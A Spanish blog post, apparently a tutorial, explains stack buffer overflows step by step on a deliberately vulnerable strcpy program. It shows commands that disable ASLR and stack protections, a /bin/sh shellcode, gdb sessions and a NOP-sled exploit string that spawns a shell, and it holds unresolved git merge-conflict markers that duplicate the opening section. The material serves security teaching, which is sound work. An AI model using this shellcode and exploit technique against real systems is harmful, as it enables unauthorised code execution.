---
layout: post
title: Buffer Overflow
excerpt: Introducción a la explotación del buffer overflow
date: 2012-12-18
categories: code
comments: true
share: true
tags: [security, buffer overflow, exploit]
---
<<<<<<< HEAD
En este artículo intento explicar con ejemplos cómo funciona un desbordamiento de buffer o _buffer overflow_. Se trata de un tipo de vulnerabilidad que se explota escribiendo más allá del final de un buffer, de tal forma que se modifique la dirección de retorno y se ejecutando un código arbitrario.

## Organización de la memoria en los procesos

Antes de nada es conveniente tener una cierta idea de cómo se organiza un proceso en memoria, qué es el stack, qué ocurre cuando se llama a una función y cuando se vuelve...

![Process Memory Organization]({{ site.url }}/images/process_mem_organization.png)

El stack es una estructura LIFO en la que se almacenan los parámetros de llamada funciones, direcciones de retorno y variables locales a la función en ejecución. Crece "hacia abajo", es decir, hacia direcciones bajas de memoria.

El _heap_, al contrario que el _stack_, crece hacia arriba. En él se almecena memoria reservada dinámicamente (como mediante `malloc`).

Los segmentos _bss_ y _data_ almacenan variables (globales y estáticas) no inicializadas e inicializadas respectivamente.

Finalmente, el segmento _text_ contiene el código ejecutable.

## Un programa vulnerable
=======
En este artículo intento explicar con ejemplos cómo funciona un
desbordamiento de buffer o _buffer overflow_. Se trata de un tipo de
vulnerabilidad que se explota escribiendo más allá del final de un
buffer, de tal forma que se modifique la dirección de retorno y se
ejecutando un código arbitrario.

## Organización de la memoria en los procesos

Antes de nada es conveniente tener una cierta idea de cómo se organiza
un proceso en memoria, qué es el stack, qué ocurre cuando se llama a una
función y cuando se vuelve...

![Process Memory Organization]({{ site.url
}}/images/process_mem_organization.png)

El stack es una estructura LIFO en la que se almacenan los parámetros de
llamada funciones, direcciones de retorno y variables locales a la
función en ejecución. Crece "hacia abajo", es decir, hacia direcciones
bajas de memoria.

El _heap_, al contrario que el _stack_, crece hacia arriba. En él se
almecena memoria reservada dinámicamente (como mediante `malloc`).

Los segmentos de lectura y escritura _bss_ y _data_ almacenan variables (globales y estáticas)
no inicializadas e inicializadas respectivamente.

Finalmente, el segmento de solo lectura _text_ contiene el código ejecutable.

### Algunos registros

Algunos registros que nos van a hacer falta son:

* __%eip__: Instruction Pointer Register. Almacena la dirección de la
siguiente instrucción que se va a ejecutar.
* __%esp__: Stack Pointer. Almacena la dirección del _top_ de la pila. Es
decir, como la pila crece "hacia abajo", apunta a la dirección del
último elemento almacenado en la pila.
* __%ebp__: Base Pointer Register. Al principio de la función valdrá
normalmente **esp**. Las direcciones de parámetros y variables locales
hacen referencia a **ebp** mediante offsets que se añaden (parámetros) o
sustraen (variables).

## ¿Qué ocurre cuando se llama a una función?

Pues pasan un montón de cosas que intento resumir:

1. Se pasan los parámetros al stack en orden inverso (primero el de más a la derecha)
2. Se lleva al stack la dirección de la siguiente instrucción para que la función, una vez terminada, sepa dónde tiene que volver
3. Asignar a __%eip__ la dirección de la función llamada para transferir el control a la misma
4. Guardar en el stack el valor de __%ebp__ (para poder recuperarlo más adelante) y actualizarlo con __%esp__
5. Llevar las variables locales al stack; por supuesto, actualizando __%esp__ por el camino.
6. Una vez finalizada la función, las cosas tienen que volver a estar como antes (es decir, recuperar el _stack frame_ anterior). De modo que __%esp__ toma el valor de __%ebp__ y se recupera del stack el valor de __%ebp__ que habíamos almacenado (el que tenía antes de transferir el control a la función)
7. Recuperar la dirección de retorno del stack y poner el valor en __%eip__ para devolver el control a la función inicial.

La cuestión es ¿qué ocurre si conseguimos manipular esa dirección de retorno? Que podríamos hacer que el programa saltase a una dirección donde hubiéramos almacenado un código "malicioso".

## Un programa vulnerable

El programa del ejemplo siguiente contiene una vulnerabilidad:

```c
#include <stdio.h>
#include <string.h>

int main (int argc, char** argv)
{
	char buf[500];
	strcpy(buf, argv[1]);

	return 0;
}
```

Hay una fución `strcpy` que copia datos sin validar los límites (como puede ocurrir con otras como `memcpy`, `gets`...) Es decir, se pueden copiar datos más allá del límite del buffer de destino si el origen es "más largo", sobreescribiendo otros datos.

Ojo, tanto el sistema operativo como el compilador (`gcc` en particular) pueden implementar ciertas protecciones. Así que, para entender bien el proceso, las deshabilitaremos. Las protecciones no son insalvables pero dificultan la explotación y no tiene sentido pelearse con ellas por ahora.

De modo que, primero, deshabilitamos [ASLR]:

```shell
sudo echo 0 > /proc/sys/kernel/randomize_va_space
```

Y compilaremos el programa anterior de la siguiente forma:

```shell
gcc -fno-stack-protector -z execstack \
  -mpreferred-stack-boundary=2 -g -o vuln vuln.c
```

El programa no tiene mucho misterio, simplemente copia la cadena que se le pase sin siguiera sacarla por pantalla:

```shell
$ ./vuln Hola
```

Pero si este es mayor que el buffer `buf`

```shell
$ ./vuln $(python -c 'print "A"*512')
Segmentation fault
```

## Shellcodes

Un inciso: un _shellcode_ es un conjunto de órdenes programadas generalmente en lenguaje ensamblador y trasladadas a opcodes (conjunto de valores hexadecimales) que suelen ser inyectadas en la pila (o stack) de ejecución de un programa para conseguir que la máquina en la que reside se ejecute la operación que se haya programado (_copypaste_ de la [Wikipedia])

No hace falta que nos rompamos la cabeza con esto, podemos usar uno ya disponible; [este shellcode] nos dará una shell con tan solo 28 bytes:

```assembly
\x31\xc0\x50\x68\x2f\x2f\x73
\x68\x68\x2f\x62\x69\x6e\x89
\xe3\x89\xc1\x89\xc2\xb0\x0b
\xcd\x80\x31\xc0\x40\xcd\x80
```

Este será el código que tendremos que inyectar en la dirección de memoria a la que hagamos apuntar el registro **eip**

## La ejecución

Ya sabemos el código que vamos a inyectar; falta saber dónde, y componer las cosas de tal forma que hagamos que las posiciones de memoria sobreescritas apunten a donde necesitamos. En esta tarea nos ayudará el depurador `gdb`:

```shell
$ gdb -q ./vuln
Reading symbols from ./vuln...done.
(gdb) disass main
Dump of assembler code for function main:
   0x080483fb <+0>:	push   %ebp
   0x080483fc <+1>:	mov    %esp,%ebp
   0x080483fe <+3>:	sub    $0x1f4,%esp
   0x08048404 <+9>:	mov    0xc(%ebp),%eax
   0x08048407 <+12>:	add    $0x4,%eax
   0x0804840a <+15>:	mov    (%eax),%eax
   0x0804840c <+17>:	push   %eax
   0x0804840d <+18>:	lea    -0x1f4(%ebp),%eax
   0x08048413 <+24>:	push   %eax
   0x08048414 <+25>:	call   0x80482d0 <strcpy@plt>
   0x08048419 <+30>:	add    $0x8,%esp
   0x0804841c <+33>:	mov    $0x0,%eax
   0x08048421 <+38>:	leave  
   0x08048422 <+39>:	ret    
End of assembler dump.
(gdb)
```

Le pedimos que nos muestre unos registros, establecemos un breakpoint a la vuelta de la función **strcpy** llamada y hacemos una ejecución "normal":

```shell
(gdb) display $esp
(gdb) display $ebp
(gdb) b *0x08048419
Breakpoint 1 at 0x8048419: file vuln.c, line 7.
(gdb) run AAAA
Starting program: /home/luis/Projects/exploits/vuln AAAA

Breakpoint 1, 0x08048419 in main (argc=2, argv=0xbffff794) at vuln.c:7
7		strcpy(buf, argv[1]);
2: $ebp = (void *) 0xbffff6f8
1: $esp = (void *) 0xbffff4fc
(gdb) c
Continuing.
[Inferior 1 (process 8334) exited normally]
(gdb)
```

Veamos ahora lo que ocurre si llenamos el buffer;

```shell
(gdb) run $(python -c 'print "A"*508')
Starting program: /home/luis/Projects/exploits/vuln $(python -c 'print "A"*508')

Breakpoint 1, 0x08048419 in main (argc=0, argv=0xbffff594) at vuln.c:7
7		strcpy(buf, argv[1]);
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info reg
eax            0x0	0
ecx            0xbffff8d0	-1073743664
edx            0xbffff4f6	-1073744650
ebx            0xb7fcf000	-1208160256
esp            0xbffff500	0xbffff500
ebp            0x41414141	0x41414141
esi            0x0	0
edi            0x0	0
eip            0x41414141	0x41414141
```

Un _Segmentation Fault_ es la forma que tiene el procesador de decirnos que hemos hecho algo "ilegal". En este caso, hemos sobreescrito la posición de memoria donde se guardaba la dirección de retorno de la función y la hemos convertido en **0x41414141**, una dirección que no nos pertenece.

Para comprobar que nuestra suposición es correcta, cambiamos los últimos bytes de nuestra cadena por otros distintos y comprobamos que son los que aparecen en el registro **eip**:

```shell
(gdb) run $(python -c 'print "A"*504 + "BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/luis/Projects/exploits/vuln $(python -c 'print "A"*504 + "BBBB"')

Breakpoint 1, 0x08048419 in main (argc=0, argv=0xbffff594) at vuln.c:7
7		strcpy(buf, argv[1]);
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

En este caso tenemos **0x42424242**, como esperábamos.

## El ataque

Comprobado que el programa es vulnerable, ahora se trata de sacar provecho del error. El objetivo es inyectar el shellcode en una dirección conocida y forzar al registro **eip** a apuntar a esa dirección.

El primer paso será conocer las direcciones de memoria donde se almacena nuestro payload. Para ello usamos de nuevo gdb:

```shell
(gdb) run $(python -c 'print "A"*504 + "BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/luis/Projects/exploits/vuln $(python -c 'print "A"*504 + "BBBB"')

Breakpoint 1, 0x08048419 in main (argc=0, argv=0xbffff594) at vuln.c:7
7		strcpy(buf, argv[1]);
(gdb) x/100wx $esp
0xbffff2fc:	0xbffff304	0xbffff6de	0x41414141	0x41414141
0xbffff30c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff31c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff32c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff33c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff34c:	0x41414141	0x41414141	0x41414141	0x41414141
[...]
0xbffff4cc:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4dc:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4ec:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4fc:	0x42424242	0x00000000	0xbffff594	0xbffff5a0
[...]
```

Vemos que nuestra cadena de "Aes" comienza en 0xbffff308 (0xbffff2fc + 8). Podemos inyectar ahí el shellcode y apuntar con cuidado a esa dirección, pero hay técnicas que facilitan las cosas; en lugar de "Aes" vamos a usar el carácter 0x90 que corresponde con el código de opecación **NOP**, es decir, "saltar a la siguiente instrucción". Si llenamos todo de **NOPs** da igual dónde caigamos, porque el procesador saltará a la instrucción siguiente hasta ejecutar el payload. Así que nuestra cadena será algo como:

```shell
$(python -c 'print "\x90"*436 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*10 + "BBBB"')
```

Simplemente hemos sustituído unos cuantos "\x90" por el shellcode que vamos a utilizar. Si lo ejecutamos, comprobamos que todo sigue como estaba, así que no nos hemos equivocado:

```shell
(gdb) run $(python -c 'print "\x90"*466 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*10 + "BBBB"')
Starting program: /home/luis/Projects/exploits/vuln $(python -c 'print "\x90"*466 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*10 + "BBBB"')

Breakpoint 1, 0x08048419 in main (argc=0, argv=0xbffff594) at vuln.c:7
7		strcpy(buf, argv[1]);
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Finalmente, sustituimos la cadena "BBBB" por una dirección de memoria de la zona que hemos llenado de **NOPs**; así, si hay algún pequeño cambio en la disposición del stack, el _exploit_ seguirá funcionando. Ojo, la arquitectura Intel es _little endian_, es decir, tendremos que introducir la dirección de memoria empezando por el byte menos significativo:

```shell
$(python -c 'print "\x90"*466 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*10 + "\xac\xf3\xff\xbf"')
```

Vamos:

```shell
(gdb) run $(python -c 'print "\x90"*466 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*10 + "\xac\xf3\xff\xbf"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/luis/Projects/exploits/vuln $(python -c 'print "\x90"*466 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*10 + "\xac\xf3\xff\xbf"')

Breakpoint 1, 0x08048419 in main (argc=0, argv=0xbffff594) at vuln.c:7
7		strcpy(buf, argv[1]);
(gdb) c
Continuing.
process 8410 is executing new program: /bin/dash
```

¡Premio! Tenemos la shell. Fuera del `gdb`también funciona, claro:

```shell
user@debian8-x86:~/exploits$ ./vuln $(python -c 'print "\x90"*466 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*10 + "\xac\xf3\xff\xbf"')
$
```

[ASLR]: https://en.wikipedia.org/wiki/Address_space_layout_randomization
[Wikipedia]: https://es.wikipedia.org/wiki/Shellcode
[este shellcode]: http://shell-storm.org/shellcode/files/shellcode-827.php
>>>>>>> 53811701b2621475625e1290373a89f6cd9b5556
